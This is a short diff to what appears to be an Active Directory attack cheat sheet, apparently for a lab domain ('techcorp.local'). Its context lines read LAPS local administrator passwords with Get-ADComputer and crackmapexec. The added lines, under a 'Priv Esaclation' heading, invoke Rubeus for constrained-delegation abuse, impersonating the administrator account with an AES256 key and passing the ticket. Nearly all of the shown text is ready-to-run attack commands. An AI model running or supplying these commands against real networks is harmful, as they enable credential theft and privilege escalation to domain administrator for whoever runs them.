@@ -151,3 +151,7 @@ Get-adcomputer -identity $pc -properties ms-mcs-admpwd | select -expandproperty 
 sudo crackmapexec ldap dc01.doamin.local -u 'uname' -p 'passwd' --kdcHost dc01.domain.local -M LAPS 
 
 
+# Priv Esaclation
+
+[Rubeus.Program]::Main("$constr_srv_for_us /user:appsvc /impersonateuser:administrator /msdsspn:cifs/US-MSSQL.us.techcorp.local /altservice:HTTP /domain:us.techcorp.local /aes256:b4cb0430da8176ec6eae2002dfa86a8c6742e5a88448f1c2d6afc3781e114335 /ptt".Split(" "))
+
